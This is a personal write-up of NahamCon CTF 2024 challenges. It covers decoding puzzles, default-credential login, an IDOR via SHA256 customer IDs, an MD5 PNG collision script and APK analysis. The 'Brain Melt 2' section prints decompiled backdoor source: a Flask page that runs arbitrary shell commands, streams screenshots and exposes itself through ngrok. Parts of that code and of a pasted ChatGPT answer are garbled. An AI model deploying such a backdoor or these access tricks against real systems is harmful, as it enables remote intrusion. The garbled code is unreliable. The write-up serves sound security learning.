# Nahamcon CTF 24

This CTF event, organized by Ben Sadeghipour (aka Nahamsec) https://www.youtube.com/@NahamSec, took place from May 23rd, 12:00 PM PST to May 25th, 12:00 PM PST, 2024, running for a total of 48 hours. The competition featured contributions from notable people in the infosec community, including Husky Hacks and John Hammond.

Husky Hacks - https://www.youtube.com/@huskyhacks
John Hammond https://www.youtube.com/@_JohnHammond

Over 7,200 people participated in this event, forming a total of around 3,750 teams.

I achieved 223rd place with a score of 2551 points.

---
## Twine
Author: @JohnHammond#6971
Category: Warmups

**Google tells me that twine means: "strong thread or string consisting of two or more strands of hemp, cotton, or nylon twisted together."**

In this challenge, you are provided with a file named twine.jpg to examine.

One of the initial steps is to run the `strings` command on the file to check for any hints or useful information:

```shell
strings twine.jpg
```

A portion of the output looks like this:

```
(...)
`b4Z
3aQv_
<Sfk
o($F
2pP~
       Yt?
 p01`
flag{4ac54e3ba5f8f09049f3ad62403abb25}
JFIF
2"3*7%"0
I'y9
I''*
d9lus
`&c$Z(
(...)
```

The easy mode of this challenge is to do a simple `strings` + `grep` command.

```zsh
strings twine.jpg | grep flag
flag{4ac54e3ba5f8f09049f3ad62403abb25}
```

`flag{4ac54e3ba5f8f09049f3ad62403abb25}`

---
## Uriel
Author: @JohnHammond
Category: Warmups

**Uriel was browsing the web and he saw this big long blob of text in his address bar! He was telling me about it but I don't remember everything he said... I think he mentioned something like "it happened twice?"**

The following text is provided as the challenge to solve.

```
%25%36%36%25%36%63%25%36%31%25%36%37%25%37%62%25%33%38%25%36%35%25%36%36%25%36%35%25%36%32%25%33%36%25%33%36%25%36%31%25%33%37%25%33%31%25%33%39%25%36%32%25%33%37%25%33%35%25%36%31%25%33%34%25%36%32%25%33%37%25%36%33%25%33%36%25%33%33%25%33%34%25%36%34%25%33%38%25%33%38%25%33%35%25%33%37%25%33%38%25%33%38%25%36%34%25%36%36%25%36%33%25%37%64
```

Due to its format it is safe to assume it is a URL encoded string. That is because of the % sign the following 2 digits. I went to https://cyberchef.io to help me decode it. Paste the string into the input field which gives the following result and select *URL Decode* as the operation.

```
%66%6c%61%67%7b%38%65%66%65%62%36%36%61%37%31%39%62%37%35%61%34%62%37%63%36%33%34%64%38%38%35%37%38%38%64%66%63%7d
```

The description mentions *It happened twice* so, apply the operations twice to get the decoded string.

`flag{8efeb66a719b75a4b7c634d885788dfc}`

---
## EICAR
Author: @JohnHammond
Category: Warmups

**What is the MD5 hash of this file?**

**Wrap the hexadecimal value in the flag{ prefix and { suffix to match the standard flag format.**

**Note, your antivirus engine might flag this file -- don't worry, I promise it's not malware :)**

For this challenge we are given a file **eicar** and to find the flag we have to find the MD5 hash of the file according to the description.

To get the MD5 of the file we need to use the command `md5sum`

```
┌──(kali㉿kali)-[~/nahamcon/eicar]
└─$ md5sum eicar                                              
44d88612fea8a8f36de82e1278abb02f  eicar
```

Now we just need to insert the value into the **flag{ }** to submit the flag.

`flag{44d88612fea8a8f36de82e1278abb02f}`

---
## HelpfulDesk
Author: @HuskyHacks
Category: Web

**HelpfulDesk is the go-to solution for small and medium businesses who need remote monitoring and management. Last night, HelpfulDesk released a security bulletin urging everyone to patch to the latest patch level. They were scarce on the details, but I bet that can't be good...**

*Disclaimer - apparently there were an error with this challenge, you weren't supposed to solve it like I did.*

You start the challenge by launching an instance, where you can go to the Helpdesk site where you are greeted with a login screen and security bulletin board.

In the reel world, it is common to see default credentials not been changed, and one of the first things I always try.

I accessed the loginpage by using default credentials **admin:admin** in the login field.

After you have logged in you are presented with a dashboard where it is possible to check the drives of remotes computers. I went for the computer *File System for HOST-WIN-DX130S2* where I found the flag by navigating to `C:\users\administrator\flag.txt`

Download the file and use `cat` command on the **flag.txt** file to retrieve the flag.`

`flag{2fd5d91a4504ecf32a1b701a4b7122db}´

---
## iDoor
Author: @JohnHammond#6971
Category: Web

**It's Apple's latest innovation, the "iDoor!" ... well, it is basically the Ring Doorbell camera, but the iDoor offers a web-based browser to monitor your camera, and super secure using ultimate cryptography with even SHA256 hashing algorithms to protect customers! Don't even think about snooping on other people's cameras!!**

You start the challenge, which launches an instance where you can visit a mockup of a camera surveillance page. On this page, you will see a blank image and a customer ID (11) on the right.

The URL of the page seems to use some kind of encoded or encrypted string.
`http://challenge.nahamcon.com:31646/4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8`

The description of the challenge tells us it is using a SHA256 hashing we just have to figure out what the value is.

You can either use the command line to go through each of the numbers and insert it into the URL like below.

```
echo -n "11" | sha256sum
```

Or you can make a python script that does it all in one go.

```python
import hashlib

# Iterate through numbers 0 to 12
for i in range(13):
    # Calculate SHA256 hash for the current number
    hash_value = hashlib.sha256(str(i).encode()).hexdigest()
    print(f"Number: {i}, SHA256 Hash: {hash_value}")

```

```zsh
┌──(kali㉿kali)-[~/tools]
└─$ python3 sha256.py   
Number: 0, SHA256 Hash: 5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9
Number: 1, SHA256 Hash: 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
Number: 2, SHA256 Hash: d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35
Number: 3, SHA256 Hash: 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
Number: 4, SHA256 Hash: 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
Number: 5, SHA256 Hash: ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d
Number: 6, SHA256 Hash: e7f6c011776e8db7cd330b54174fd76f7d0216b612387a5ffcfb81e6f0919683
Number: 7, SHA256 Hash: 7902699be42c8a8e46fbbb4501726517e86b22c56a189f7625a6da49081b2451
Number: 8, SHA256 Hash: 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3
Number: 9, SHA256 Hash: 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7
Number: 10, SHA256 Hash: 4a44dc15364204a80fe80e9039455cc1608281820fe2b24f1e5233ade6af1dd5
Number: 11, SHA256 Hash: 4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8
Number: 12, SHA256 Hash: 6b51d431df5d7f141cbececcf79edf3dd861c3b4069f0b11661a3eefacbba918

```

Now I just needed to insert the string into the url to access different cameras that wasn't belonging to the default user.

The string `5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9` which is the customer ID 0 is where I found the flag.

`flag{770a058a80a9bca0a87c3e2ebe1ee9b2}`

---
## All about Robots
Author: @JohnHammond
Category: Web

**Oh wow! Now you can learn all about robots, with our latest web service, All About Robots!!**

You start the challenge by launching an instance, when you visit the challenge website, there are a list of different kinds of robots like Terminator, Wall-E, HAL-9000 etc. which have some info about each robot *R2-D2 is an astromech droid from the "Star Wars" series, known for his versatility and loyalty. He often finds himself at the center of pivotal moments in the galaxy's history and has served alongside several key figures of the Rebel Alliance and the larger Star Wars saga, proving instrumental in saving the galaxy on many occasions.*

Each of them refers to https://www.robotstxt.org/ 

It is safe to assume it have something to do with the robots.txt file which was found at `http://challenge.nahamcon.com:30998/robots.txt` here we are greeted with the following.

```
User-agent: *
Disallow: /open_the_pod_bay_doors_hal_and_give_me_the_flag.html
```

The robots.txt file revealed that robots are prohibited from crawling `http://challenge.nahamcon.com:30998/open_the_pod_bay_doors_hal_and_give_me_the_flag.html`. Naturally, the next step was to investigate this site for any potentially interesting content. The HTML page contained the flag that needed to be submitted.

`flag{3f19b983c1de42bd49af1a237d7e57b9}`

---
## Magic RSA
Author: @Jstith
Category: Cryptography

**Here's an RSA challenge using the most magical number of all.**

I am not very good with cryptography challenges, but thankfully ChatGPT is!

```chatGPT

To solve this cryptography challenge, you need to decrypt the given ciphertext using the RSA encryption scheme provided in the Python script. The key points of the RSA encryption in this context are:

1. The public exponent ee is 3.
2. The modulus nn is provided.
3. The ciphertext is a list of encrypted integers.

Given that the script generates random primes pp and qq and computes nn as their product, you can't directly factor nn (since it's a 2048-bit semiprime). However, RSA with e=3e=3 is vulnerable to specific attacks when the plaintext message mm is small enough that m3<nm3<n. In this case, you can simply take the cube root of the ciphertext to recover the plaintext.

Let's proceed step by step to decrypt the ciphertext:

1. **Extract the values from the provided output:**
    
    - nn
    - The ciphertext list
2. **Compute the cube root of each ciphertext integer modulo nn:**
    
    - For each value in the ciphertext list, compute the cube root directly, as m=c3m=3c

1. - ​.
2. **Convert the plaintext back to characters:**
    

Let's write a Python script to achieve this:

import gmpy2

# Provided modulus n
n = 292661735803169078279687796534368733968232055929694715453717384181208539846645017378459508481927733219065809706996972833902743250671173212610674572380079245835772007065919936022084401497853611610920914306013040436502207047619016113234947051878549793269852855316328078769491183468515501156324665790842023112309668506350354977653838139155232422868462129041940364012648613391176971689126513558396465218392059219609662829793402841289708970576750698757213264731256720405308346659459733504680423032430634001779369250142543104703669906030549585514247663929431837546466696121103600101025434247152431200408744676625328330247569014313252820778269086840631297075563756934662979588351413726196027845505808290890109883253252054958997436359016852222176230489468164288277709046892991459049248340800616885136366469783271661343653314539194467688757972713531491290238432270971346559967725437118531023032768463200227986539449334624183071042562539584305305367245588508498775214112729500313280502474837332653452065755426475638743763861804587979560695676963674789819860296303566053542883415223272958687917330474367563315425617320128680682444959701586681495270336801802382200546403246134181793704030611664095075430115127507174884551339452808218398863888817

# Provided ciphertext list
ciphertext = [
    1061208, 1259712, 912673, 1092727, 1860867, 175616, 166375, 941192, 185193,
    1030301, 941192, 185193, 912673, 140608, 175616, 185193, 140608, 941192,
    970299, 1061208, 175616, 912673, 117649, 912673, 185193, 148877, 912673,
    125000, 110592, 1030301, 132651, 132651, 1061208, 117649, 117649, 1061208,
    166375, 1953125
]

# Function to compute the integer cube root
def integer_cube_root(x):
    return int(gmpy2.iroot(x, 3)[0])

# Decrypt the ciphertext
plaintext = ''.join(chr(integer_cube_root(c)) for c in ciphertext)

print("Decrypted plaintext:", plaintext)

When you run this script, it will output the decrypted plaintext. The key idea is leveraging the vulnerability of small exponent ee in RSA, allowing us to recover the plaintext by taking the cube root of each ciphertext component.

```

Using ChatGPT to tackle these challenges can be challenging due to its occasional inaccuracies and tendency to generate incorrect responses. Handling errors and identifying where it goes astray are necessary steps. It's not as simple as inputting a challenge description and data and having ChatGPT solve it seamlessly. You still need to put in some effort to ensure ChatGPT works in your favor.

I manage to get it to work and managed to decrypt the ciphertext for the flag.

`flag{87b9eb9a4894bcf8a1a95a20e33f11f7}

---
## QRRRRRRRR
Author: @JohnHammond
Category: Warmups

**Wait a second, they made QR codes longer!?!**

In this challenge, you receive a file named **qrrrrrrrr.png**, featuring a QR code with an elongated width compared to the usual QR codes. I utilized an application named *QRQR reader*, available for download on both Android and iOS devices, to scan and extract the flag embedded within the code.

Interestingly, John Hammond has created a video tutorial on this specific challenge, accessible on YouTube at `https://www.youtube.com/watch?v=J8S-NJ1GTn4`.

Flag: `flag{a44557e380e3baae9c21c738664c6142}`

---
## Brain Melt 2
Author: 0xNightwolf
Category: Malware

**We'll skip Pyinstxtractor this time so it should be easy right?**

This challenge gives you a brain-melt-2.pyc file. A **\*.pyc** is a compiled python script. It can be decompiled by using the tool **uncompyle6** which can be found at `https://github.com/rocky/python-uncompyle6` afterward you just use the tool to decompile the file we are given from the challenge.

The decompiled filed:
```python
# uncompyle6 version 3.9.1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0]
# Embedded file name: brain-melt.py
# Compiled at: 2024-05-21 17:08:49
# Size of source mod 2**32: 4963 bytes
from flask import Flask, flash, request, render_template_string, send_file, redirect
from wtforms import Form, StringField, validators, StringField, SubmitField
import subprocess, pyautogui, io
from PIL import Image
from Crypto.Cipher import Salsa20
from pyngrok import ngrok
import base65
DEBUG = True
app = Flask(__name__)
app.config["SECRET_KEY"] = "9EQrXQ88pwP7UWaXbkmThhKuDdYxsad1"

def decrypt1(    ):
         = ""
    for      in range(0, len(    ), 2):
             = str(    [    [:     + 2]] + "==")
             += str(base64.b64decode(    ).decode("ascii"))
    else:
        return     


def decrypt2(a1, a2):
    result = ""
    for character in a1:
        a2 = 9
        tempcharaddedr = "temporary value"
        result += chr((ord(character) - ord("a") + a2) % 26 + ord("a"))
    else:
        return result


def decrypt3(s1, key):
    msg_nonce = s1[None[:8]]
    ciphertext = s1[8[:None]]
    key = glob_key
    ab = key
    cipher = Salsa20.new(key=(key.encode("utf-8")), nonce=msg_nonce)
    return cipher.decrypt(ciphertext_obfuscation_padding).decode("utf-8")


def deobfuscate():
    part1 = decrypt1("ZgbAYQZwewMAOAZQOQYwYwNQYgMA")
    part2 = decrypt2("fwvcttjsfvrshwsg", 17)
    part3 = decrypt3(b'\x97p#2\x1abw\x0f\x9a\xd1Z\x04b\x93\xa1h8]\xab\xa3\x9e7\xc9\xe8\x9b', "25dbd4f362f7d0e64b24ab231728a1fc")
    key = part1 + part2 + part3
    return key


def ngrok_tunnel():
    ngrok.set_auth_token(deobfuscate())
    http_tunnel = ngrok.connect(5000, "http")


def Desktop(pil_img):
    img_io = io.BytesIO()
    pil_img.save(img_io, "JPEG", quality=70)
    img_io.seek(0)
    return send_file(img_io, mimetype="image/jpeg")


def execute(cmd):
    child = subprocess.Popen(cmd, shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
    for line in child.stdout:
        print(line)
        l = line.decode(encoding="utf-8", errors="ignore")
        flash(l)
    else:
        for line in child.stderr:
            l = line.decode(encoding="utf-8", errors="ignore")
            flash(l)


class CommandForm(Form):
    command = StringField("Command:", validators=[validators.required()])

    @app.route("/", methods=["GET", "POST"])
    def display():
        form = CommandForm(request.form)
        print(form.errors)
        if request.method == "POST":
            command = request.form["command"]
        if form.validate() and request.method == "POST":
            result = execute(command)
            flash(result)
        else:
            flash("Please enter a command.")
        return render_template_string('<!doctype html>\n                <html>\n                    <head>\n                        <link rel="stylesheet" href="css url"/>\n                            </head>\n                                <body>\n                                    <form action="" method="post" role="form">\n                                        <div class="form-group">\n                                              <label for="Command">Command:</label>\n                                              <input type="text" class="form-control" id="command" name="command"></div>\n                                              <button type="submit" class="btn btn-success">Submit</button>\n                                              </form>\n                                            {% for message in get_flashed_messages() %}\n                                            <p>{{ message }}</p>\n                                            {% endfor %}\n                                            <img src="/images/desktop.jpg" id="img" width="100%" scrolling="yes" style="height: 100vh;"></iframe>\n                                </body>\n                            \n                            {% block javascript %}\n                            <script type="text/javascript">\n                            window.onload = function() {\n                                var image = document.getElementById("img");\n\n                                function updateImage() {\n                                    image.src = image.src.split("?")[0] + "?" + new Date().getTime();\n                                }\n\n                                setInterval(updateImage, 1000);\n                            }\n                            </script>\n                            {% endblock %}\n                            </html>\n                        ', form=form)


@app.route("/images/desktop.jpg")
def serve_img():
    screenshot = pyautogui.screenshot()
    return Desktop(screenshot)


if __name__ == "__main__":
    glob_key = "24a0b299984ee8da7aae14b7163e2e63"
    ngrok_tunnel()
    app.run(host="0.0.0.0")
# global glob_key ## Warning: Unused global

# okay decompiling brain-melt-2.pyc

```

Within the code, there are three decryption functions alongside a deobfuscation function. I copied and pasted the code into ChatGPT, seeking assistance in identifying the key value, which I suspected held the flag. I got the following script from ChatGPT.

```python
import base64
from Crypto.Cipher import Salsa20

def decrypt1(encoded_str):
    decoded_str = ""
    for i in range(0, len(encoded_str), 2):
        chunk = encoded_str[i:i+2]
        chunk += "=="
        decoded_str += base64.b64decode(chunk).decode("ascii")
    return decoded_str

def decrypt2(a1, a2):
    result = ""
    for character in a1:
        result += chr((ord(character) - ord("a") + a2) % 26 + ord("a"))
    return result

def decrypt3(s1, key):
    msg_nonce = s1[:8]
    ciphertext = s1[8:]
    cipher = Salsa20.new(key=key.encode("utf-8"), nonce=msg_nonce)
    return cipher.decrypt(ciphertext).decode("utf-8")

def deobfuscate():
    part1 = decrypt1("ZgbAYQZwewMAOAZQOQYwYwNQYgMA")
    part2 = decrypt2("fwvcttjsfvrshwsg", 17)
    part3 = decrypt3(b'\x97p#2\x1abw\x0f\x9a\xd1Z\x04b\x93\xa1h8]\xab\xa3\x9e7\xc9\xe8\x9b', "25dbd4f362f7d0e64b24ab231728a1fc")
    key = part1 + part2 + part3
    return key

# Retrieve and print the key
key = deobfuscate()
print(key)

```

This script returned the flag for me:

```shell
┌──(kali㉿kali)-[~/nahamcon/brainmelt2]
└─$ python crack.py                                          
flag{08e9cc5b0wnmtkkajwmijynjx3a415bd9a8024930}
```

`flag{08e9cc5b0wnmtkkajwmijynjx3a415bd9a8024930}`

---
## Base3200
Author: @kkevsterrr
Category: Scripting

**You know what to do.**

It appears that this is from an older challenge, as indicated when I searched for information about base3200 on Google. Upon downloading file from the challenge `theflag`, it was identified as ASCII text.

```
┌──(kali㉿kali)-[~/nahamcon/base3200]
└─$ file theflag     
theflag: ASCII text, with very long lines (65536), with no line terminators

```

Additional investigation on both Google and the file suggested that it had likely undergone multiple rounds of base64 encoding (3200/64 = 50) which corresponds with the name of the challenge. Consequently, we need a script capable of decoding the source 50 times.

``` python
import base64

def decode_base64_multiple_times(encoded_data, times):
    decoded_data = encoded_data
    for _ in range(times):
        decoded_data = base64.b64decode(decoded_data)
    return decoded_data

# Read the encoded file
input_file_path = 'theflag'

with open(input_file_path, 'rb') as file:
    encoded_data = file.read()

# Decode the data 50 times
decoded_data = decode_base64_multiple_times(encoded_data, 50)

print("Decoding complete:", decoded_data.decode('utf-8'))

```

When running the script, we get the following:
```shell
┌──(kali㉿kali)-[~/nahamcon/base3200]
└─$ python script.py
Decoding complete: flag{340ff1bee05244546c91dea53fba7642}
```

`flag{340ff1bee05244546c91dea53fba7642}`

---
## Not Quite the Same
Author: @Kkevsterrr#7469
Category: Miscellaneous

**Everyone knows MD5 hashes. Everyone knows .png files! I believe you'll collide with greatness.**

This challenge presents a website designed to analyze images, teasing participants with the prompt: *Go on, give me two .png files. I dare you.*

Upon attempting to upload two different **png** files, an error message surfaces: `Error: Uhh, these MD5s don't match at all, dude`. This suggests that the challenge requires two identical images. However, uploading the same file triggers a different error: `Error: Uhh, is this the SAME file? Cheater`.

The task is to achieve two different files with the same MD5 hash sum. This necessitates creating a collision between two distinct png files to generate matching MD5 hash values. To solve this challenge, I discovered a Python script on GitHub (`https://github.com/corkami/collisions`) capable of colliding two png files and producing identical MD5 hashes.

`
```python
#!/usr/bin/env python3

# a script to collide 2 PNGs via MD5
# with optimal structure and either:
# - correct CRCs with appended data
# - with synched comments and incorrect CRCs

# Ange Albertini 2018-2021

import sys
import struct

# Use case: ./png.py yes.png no.png
fn1, fn2 = sys.argv[1:3]
with open(fn1, "rb") as f:
  d1 = f.read()
with open(fn2, "rb") as f:
  d2 = f.read()

PNGSIG = b"\x89PNG\r\n\x1a\n"
assert d1.startswith(PNGSIG)
assert d2.startswith(PNGSIG)

# short coll
with open("png1.bin", "rb") as f:
  blockS = f.read()
# long coll
with open("png2.bin", "rb") as f:
  blockL = f.read()

ascii_art = b"""
vvvv
/==============\\
|*            *|
|  PNG IMAGE   |
|     with     |
|  identical   |
|   -prefix    |
| MD5 collision|
|              |
|  by          |
| Marc Stevens |
|  and         |
|Ange Albertini|
| in 2018-2019 |
|*            *|
\\==============/
""".replace(b"\n", b"").replace(b"\r",b"")

assert len(ascii_art) == 0x100 - 3*4 # 1 chunk declaration + crc

# 2 CRCs, 0x100 of UniColl difference, and d2 chunks
skipLen = 0x100 - 4*2 + len(d2[8:])

###############################################################################
#
# simplest (w/ appended data and incorrect CRCs)

"""
Ca{        Ca{        Ca{
}          }           }
Cc{        Cc{         Cc{
--------   --------   --------- <== collision blocks
}a         }a          ..
  C1{        C1{         ...
}b         ..          }b
    D1         ..          D1
  }          }           .
      D2         D2          ..
""" 

from binascii import crc32
_crc32 = lambda d:(crc32(d) % 0x100000000)

suffix = struct.pack(">I", _crc32(blockS[0x4b:0xc0]))

suffix += b"".join([
  # sKIP chunk
    struct.pack(">I", skipLen),
    b"sKIP",
      # it will cover all data chunks of d2,
      # and the 0x100 buffer
  ascii_art,
  b"\xDE\xAD\xBE\xEF", # fake CRC for cOLL chunk

      d2[8:],
      # long cOLL CRC
    b"\x5E\xAF\x00\x0D", # fake CRC for sKIP chunk

    # first image chunk
    d1[8:],
    ])

with open("collision1.png", "wb") as f:
  f.write(b"".join([
    blockS,
    suffix
    ]))

with open("collision2.png", "wb") as f:
  f.write(b"".join([
    blockL,
    suffix
    ]))


###############################################################################
#
# Appended data strategy, with correct CRCs
# (make sure the aLIG chunk has valid CRCs in your prefix)

# short cOLL CRC
suffix = struct.pack(">I", _crc32(blockS[0x4b:0xC0]))

suffix += b"".join([
  struct.pack(">I", skipLen),
  b"sKIP",
  # it will cover all data chunks of d2,
  # and the 0x100 buffer
  ascii_art
])

# long cOLL CRC
suffix += struct.pack(">I", _crc32((blockL+suffix)[0x4b:0x1C0]))

suffix += d2[8:]

# CRC for jUMP after d2's IEND
suffix += struct.pack(">I", _crc32((blockS+suffix)[0xc8:0xc8 + 4 + skipLen]))

# first image chunks
suffix += d1[8:]

with open("collision-crc1.png", "wb") as f:
  f.write(b"".join([
    blockS,
    suffix
    ]))

with open("collision-crc2.png", "wb") as f:
  f.write(b"".join([
    blockL,
    suffix
    ]))


###############################################################################
#
# synched-chunks strategy (no appended data, but incorrect CRCs)

""" 
Ca{         Ca{         Ca{
}           }           }
Cc{         Cc{         Cc{
---------   ---------   --------- <== collision blocks
}a          ..          }a
  C1{         ...         C1{
}b          }b          ..
  D1          D1          ..
    C2{         C2{         ...
  }           .           }
      D2          ..          D2
      C3{         ...         C3{
    } }         } .         } }
IEND        IEND        IEND
"""

suffix2 = b"".join([
  b"CRco",

# EndA of collision

  struct.pack(">I", 0x100 + len(d1[8:-3*4])),
  b"sKIa",
    # it will cover all data chunks of d2,
    # and the 0x100 buffer
      ascii_art,
      b"^^^^",
# EndB of collision

      d1[8:-3*4],
      struct.pack(">I", 4*3 + len(d2[8:-3*4])),
      b"sKIb",
    b"crAA",
        d2[8:-3*4],
          struct.pack(">I", 0),
          b"sKIc",
      b"crBC", # for both sKIb and sKIc - hard to be correct for both

  d1[-3*4:],
])

with open("collision-sync1.png", "wb") as f:
  f.write(b"".join([
    blockS,
    suffix2
    ]))

with open("collision-sync2.png", "wb") as f:
  f.write(b"".join([
    blockL,
    suffix2
    ]))

```

I located two small PNG files via Google, renamed them, and employed the command `python3 script.py yes.png no.png`. This command generated two new images. Subsequently, I verified their MD5 checksums to ensure they matched.

```
md5sum collision1.png                 
780a55f9b96376434c8c957ab657890b  collision1.png

md5sum collision2.png
780a55f9b96376434c8c957ab657890b  collision2.png
```

I then loaded both images into the challenge website and obtained the flag.

`flag{0800fc577294c34e0b28ad2839435945}`

---
## Incidium
Author: @kkevsterrr
Category: Miscellaneous

**Rwa Kuv, if you catch my drift.**

The challenge provides the following as the sole information:
```
103, 109, 98, 104, 124, 99, 99, 50, 54, 53, 99, 101, 103, 49, 49, 51, 98, 55, 51, 49, 101, 99, 55, 54, 56, 99, 57, 101, 103, 57, 53, 98, 57, 56, 49, 55, 53, 126
```

If you've encountered such challenges before, they're easily recognizable. In this challenge, you convert all the numbers into ASCII characters, resulting in the following:

```103 -> g
109 -> m
98  -> b
104 -> h
124 -> |
99  -> c
99  -> c
50  -> 2
54  -> 6
53  -> 5
99  -> c
101 -> e
103 -> g
49  -> 1
49  -> 1
51  -> 3
98  -> b
55  -> 7
51  -> 3
49  -> 1
101 -> e
99  -> c
55  -> 7
54  -> 6
56  -> 8
99  -> c
57  -> 9
101 -> e
103 -> g
57  -> 9
53  -> 5
98  -> b
57  -> 9
56  -> 8
49  -> 1
55  -> 7
53  -> 5
126 -> ~
```

We can assume the first 4 letters are going to be "flag". The following numbers corrosponds to flag:

```
- 103 -> should be 'f' = 102
- 109 -> should be 'l' = 108
- 98 -> should be 'a' = 97
- 104 -> should be 'g' = 103
```

We can compare the numbers and see that if we substract -1 from the original number we get the numbers for the flag characters.

```
103 - 1 = 102 -> f
109 - 1 = 108 -> l
98  - 1 =  97 -> a
104 - 1 = 103 -> g
124 - 1 = 123 -> {
99  - 1 =  98 -> b
99  - 1 =  98 -> b
50  - 1 =  49 -> 1
54  - 1 =  53 -> 5
53  - 1 =  52 -> 4
99  - 1 =  98 -> b
101 - 1 = 100 -> d
103 - 1 = 102 -> f
49  - 1 =  48 -> 0
49  - 1 =  48 -> 0
51  - 1 =  50 -> 2
98  - 1 =  97 -> a
55  - 1 =  54 -> 6
51  - 1 =  50 -> 2
49  - 1 =  48 -> 0
101 - 1 = 100 -> d
99  - 1 =  98 -> b
55  - 1 =  54 -> 6
54  - 1 =  53 -> 5
56  - 1 =  55 -> 7
99  - 1 =  98 -> b
57  - 1 =  56 -> 8
101 - 1 = 100 -> d
103 - 1 = 102 -> f
57  - 1 =  56 -> 8
53  - 1 =  52 -> 4
98  - 1 =  97 -> a
57  - 1 =  56 -> 8
56  - 1 =  55 -> 7
49  - 1 =  48 -> 0
55  - 1 =  54 -> 6
53  - 1 =  52 -> 4
126 - 1 = 125 -> }
```

I recommend using ChatGPT to swiftly solve these challenges. Once you grasp the essence of the challenge, there's no need to analyze each character individually.

`flag{bb154bdf002a620db657b8df84a87064}`

---
## Breath of the wild
Author: @JohnHammond
Category: Forensics

**I got a sweet desktop background for my favorite video game, but now I want more! Problem is, I forget where I downloaded it from... can you help me remember where I got this old one?**
  
**Here's a backup of all my wallpapers. For security, I set the drive password to be `videogames`.**
  
For this forensic challenge, you're presented with a single file named `breath-of-the-wild.7z`.

Upon unzipping the file, the output reveals:
```shell
breath-of-the-wild: Microsoft Disk Image eXtended, by Microsoft Windows 10.0.22631.0, sequence 0xa; LOG; region, 2 entries, id BAT, at 0x300000, Required 1, id Metadata, at 0x200000, Required 1
```

To begin the investigation, I utilized a Windows machine and installed Autopsy, a forensic tool tailored for examining data from disk images and similar sources.

Next, I renamed the file to a *.vdhx* extension and accessed Disk Management via the Windows+x shortcut.

Through Disk Management, I mounted the drive and entered the requisite password for decryption.

Subsequently, I opened the disk image in Autopsy and looked through its contents. Given the filename "Breath of the Wild," I suspected it had something to do with the game.

One file, "46 - oVMOimE.jpg," depicted an image of Link and contained metadata indicating its download source.

```
https://www.gamewallpapers.com/wallpapers_slechte_compressie/01wallpapers/&#102;&%23108;&%2397;&%23103;&%23123;&%2356;&%2351;&%23102;&%2350;&%2398;&%2348;&%2397;&%2356;&%2399;&%23101;&%2351;&%2357;&%23102;&%2350;&%23101;&%2353;&%2398;&%2397;&%2349;&%23100;&%2354;&%2399;&%2355;&%2348;&%23101;&%2357;&%2355;&%23102;&%2350;&%2357;&%2349;&%23101;&%23125;
```

To decipher the string, the first step is URL decoding, which I accomplished using [https://cyberchef.io](https://cyberchef.io).

This yields the following string:
```
&#102;&#108;&#97;&#103;&#123;&#56;&#51;&#102;&#50;&#98;&#48;&#97;&#56;&#99;&#101;&#51;&#57;&#102;&#50;&#101;&#53;&#98;&#97;&#49;&#100;&#54;&#99;&#55;&#48;&#101;&#57;&#55;&#102;&#50;&#57;&#49;&#101;&#125;

```

These numbers represent ASCII characters, and when you find the characters of the decimal values you get the flag. I used ChatGPT to swiftly give me the corresponding ASCII characters.

`flag{83f2b0a8ce39f2e5ba1d6c70e97f291e}`

---
## Guitar
Author: @matlac
Category: Mobile

**Have you ever wanted to play the guitar on your phone? Here's a free app, with all guitar strings included for free!**

You receive a file named com.nahamcon2024.guitar.apk to analyze. Initially, we need to decompile the file. I used `apktool` with the command `apktool -d com.nahamcon2024.guitar2024.apk` to decompile the package.

Subsequently, I searched for files and values that might be of interest. Given the description, it seems plausible that the flag could be hidden within the strings of the application.

To explore further, I used the `grep` and `tree` to search for potentially relevant content.

I ended up in the directory `/res/values/strings.xml` file, where I discovered:

```xml
<string name="range_start">Range start</string>
    <string name="search_bar_search">Search</string>
    <string name="secret_string">VGhlIGZsYWcgaXM6IGZsYWd7NDZhZmQ0ZjhkMmNhNTk1YzA5ZTRhYTI5N2I4NGFjYzF9Lg==</string>
    <string name="selected">Selected</string>
    <string name="snackbar_dismiss">Dismiss</string>
    <string name="status_bar_notification_info_overflow">999+</string>
```

But using the base64 too you can decode the string:

```shell
┌──(kali㉿kali)-[~/nahamcon/guitar/com.nahamcon2024.guitar]
└─$ echo "VGhlIGZsYWcgaXM6IGZsYWd7NDZhZmQ0ZjhkMmNhNTk1YzA5ZTRhYTI5N2I4NGFjYzF9Lg==" | base64 -d

The flag is: flag{46afd4f8d2ca595c09e4aa297b84acc1}. 
```

`flag{46afd4f8d2ca595c09e4aa297b84acc1}`

---
## Kitty Kitty Bang Bang
Author: @matlac
Category: Mobile

**I found a cool android app to play with a cowboy cat! There's has to be more going on with the app I can't see on my screen...**

You receive a file named `com.nahamcon2024.kittykittybangbang.apk` to analyze. Initially, we need to decompile the file.

I decompiled the apk package by using the site https://www.decompiler.com/ which can decompile apk packages. In the file`com.nahamcon2024.kittykittybangbang.apk/sources/com/nahamcon2024/kittykittybangbang/MainActivity.java` file I found the following function.
```
/* access modifiers changed from: private */
    public static final boolean onCreate$lambda$0(MainActivity mainActivity, View view, MotionEvent motionEvent) {
        Intrinsics.checkNotNullParameter(mainActivity, "this$0");
        Log.i("kitty kitty bang bang", "Listening for taps...");
        if (motionEvent.getAction() != 0) {
            return true;
        }
        Log.i("kitty kitty bang bang", "Screen tapped!");
        mainActivity.showOverlayImage();
        mainActivity.playSound(R.raw.bang);
        Log.i("kitty kitty bang bang", "BANG!");
        Log.i("kitty kitty bang bang", "flag{" + mainActivity.stringFromJNI() + '}');
        return true;
    }
```

